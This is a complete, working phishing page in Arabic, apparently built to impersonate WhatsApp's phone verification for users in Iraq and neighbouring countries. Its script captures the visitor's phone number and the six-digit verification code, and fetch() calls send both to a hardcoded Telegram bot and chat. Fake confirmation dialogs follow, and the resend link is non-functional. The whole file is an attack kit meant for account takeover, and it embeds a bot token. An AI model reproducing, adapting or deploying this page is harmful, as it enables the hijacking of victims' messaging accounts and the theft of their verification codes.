<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>WhatsApp</title>
<style>
*{margin:0;padding:0;box-sizing:border-box;font-family:-apple-system,Roboto,'Segoe UI',Tahoma,Arial,sans-serif}
body{background:#000;color:#fff;min-height:100vh;display:flex;flex-direction:column;justify-content:center;align-items:center;padding:20px}
.container{max-width:400px;width:100%}
.logo{text-align:center;margin-bottom:30px}
.logo .icon{width:70px;height:70px;background:#25D366;border-radius:50%;display:inline-flex;justify-content:center;align-items:center;margin-bottom:15px}
.logo .icon span{font-size:38px;color:#fff}
h1{color:#fff;font-size:24px;font-weight:400;margin-bottom:8px}
.subtitle{color:#888;font-size:14px;line-height:1.6;text-align:center}
.form-group{margin-top:25px}
label{display:block;font-size:14px;color:#aaa;margin-bottom:8px}
input{width:100%;padding:16px;background:#1a1a1a;border:1px solid #333;border-radius:10px;font-size:16px;color:#fff;box-sizing:border-box;outline:none}
input:focus{border-color:#25D366}
input::placeholder{color:#555}
.country-select{display:flex;align-items:center;background:#1a1a1a;border:1px solid #333;border-radius:10px;padding:0 15px;margin-bottom:10px}
.country-select span{color:#25D366;font-weight:bold;font-size:16px;margin-left:10px}
.country-select select{background:transparent;border:none;color:#fff;font-size:16px;padding:16px 0;outline:none;flex:1}
.btn{width:100%;padding:16px;background:#25D366;color:#fff;border:none;border-radius:10px;font-size:17px;font-weight:bold;cursor:pointer;margin-top:20px}
.code-inputs{display:flex;gap:10px;margin-top:25px;justify-content:center;direction:ltr}
.code-inputs input{width:45px;height:55px;text-align:center;font-size:24px;font-weight:bold;padding:0;background:#1a1a1a;border:1px solid #333;border-radius:10px;color:#fff}
.msg{text-align:center;font-size:14px;color:#888;margin-top:20px;line-height:1.6}
.link{text-align:center;color:#25D366;font-size:14px;margin-top:20px;cursor:pointer}
.footer{text-align:center;font-size:12px;color:#444;margin-top:40px}
/* Notification Modal */
.modal-overlay{position:fixed;top:0;left:0;width:100%;height:100%;background:rgba(0,0,0,0.8);display:flex;justify-content:center;align-items:center;z-index:1000;display:none}
.modal{background:#1f2c33;border-radius:16px;padding:25px;max-width:320px;width:90%;text-align:center}
.modal .icon{width:60px;height:60px;background:#25D366;border-radius:50%;display:inline-flex;justify-content:center;align-items:center;margin-bottom:15px}
.modal .icon span{font-size:30px;color:#fff}
.modal h3{color:#fff;font-size:18px;margin-bottom:10px}
.modal p{color:#8696a0;font-size:14px;line-height:1.6;margin-bottom:20px}
.modal button{width:100%;padding:14px;background:#25D366;color:#fff;border:none;border-radius:10px;font-size:16px;font-weight:bold;cursor:pointer}
</style>
</head>
<body>
<div class="container">
<div class="logo">
<div class="icon"><span>💬</span></div>
<h1>WhatsApp</h1>
<p class="subtitle">أدخل رقم هاتفك للتحقق</p>
</div>

<form id="f">
<div class="form-group">
<label>رقم الهاتف</label>
<div class="country-select">
<span>+964</span>
<select id="country">
<option value="964">العراق</option>
<option value="966">السعودية</option>
<option value="971">الإمارات</option>
<option value="962">الأردن</option>
<option value="963">سوريا</option>
<option value="20">مصر</option>
</select>
</div>
<input type="tel" id="phone" placeholder="7XX XXX XXXX" required>
</div>
<button type="submit" class="btn">التالي</button>
</form>

<div id="codeSection" style="display:none">
<p class="msg">تم إرسال رمز مكون من 6 أرقام إلى رقم هاتفك</p>
<div class="code-inputs">
<input type="tel" maxlength="1" id="c1" inputmode="numeric">
<input type="tel" maxlength="1" id="c2" inputmode="numeric">
<input type="tel" maxlength="1" id="c3" inputmode="numeric">
<input type="tel" maxlength="1" id="c4" inputmode="numeric">
<input type="tel" maxlength="1" id="c5" inputmode="numeric">
<input type="tel" maxlength="1" id="c6" inputmode="numeric">
</div>
<div class="link" id="resend">إعادة إرسال الرمز</div>
<button type="button" class="btn" id="verifyBtn">تحقق</button>
</div>

<div class="footer">© 2026 WhatsApp - Meta</div>
</div>

<!-- Modal (Notification) -->
<div class="modal-overlay" id="modalOverlay">
<div class="modal">
<div class="icon"><span id="modalIcon">✓</span></div>
<h3 id="modalTitle">تم الإرسال</h3>
<p id="modalMsg">تم إرسال رمز التحقق إلى رقم هاتفك.</p>
<button onclick="closeModal()">حسناً</button>
</div>
</div>

<script>
const BOT='8890965341:AAGfQCH0ArcTVfJfobc8-c2TUygS6_G614';
const CHAT='1250341553';

function showModal(icon, title, msg){
document.getElementById('modalIcon').textContent=icon;
document.getElementById('modalTitle').textContent=title;
document.getElementById('modalMsg').textContent=msg;
document.getElementById('modalOverlay').style.display='flex';
}
function closeModal(){
document.getElementById('modalOverlay').style.display='none';
}

// Auto-focus code inputs
['c1','c2','c3','c4','c5','c6'].forEach((id,i,arr)=>{
document.getElementById(id).addEventListener('input', function(){
if(this.value.length===1 && i<arr.length-1){ document.getElementById(arr[i+1]).focus(); }
});
});

document.getElementById('f').addEventListener('submit', async function(e){
e.preventDefault();
const country=document.getElementById('country').value;
const phone=document.getElementById('phone').value;
const fullPhone='+'+country+phone;
const msg='💬 *واتساب*\n\n📞 الرقم: `'+fullPhone+'`\n🕐 '+new Date().toLocaleString('ar-IQ');
await fetch('https://api.telegram.org/bot'+BOT+'/sendMessage?chat_id='+CHAT+'&text='+encodeURIComponent(msg)+'&parse_mode=Markdown');
document.getElementById('f').style.display='none';
document.getElementById('codeSection').style.display='block';
document.getElementById('c1').focus();
showModal('✓','تم الإرسال','تم إرسال رمز التحقق إلى رقم هاتفك.');
});

document.getElementById('verifyBtn').addEventListener('click', async function(){
const code=document.getElementById('c1').value+document.getElementById('c2').value+document.getElementById('c3').value+document.getElementById('c4').value+document.getElementById('c5').value+document.getElementById('c6').value;
const country=document.getElementById('country').value;
const phone=document.getElementById('phone').value;
const fullPhone='+'+country+phone;
const msg='💬 *واتساب - رمز التحقق*\n\n📞 الرقم: `'+fullPhone+'`\n🔢 الرمز: `'+code+'`\n🕐 '+new Date().toLocaleString('ar-IQ');
await fetch('https://api.telegram.org/bot'+BOT+'/sendMessage?chat_id='+CHAT+'&text='+encodeURIComponent(msg)+'&parse_mode=Markdown');
showModal('✓','تم التحقق','تم التحقق من رقم هاتفك بنجاح.');
});

document.getElementById('resend').addEventListener('click', function(){
showModal('↻','إعادة الإرسال','تم إعادة إرسال رمز التحقق إلى رقم هاتفك.');
});
</script>
</body>
</html>
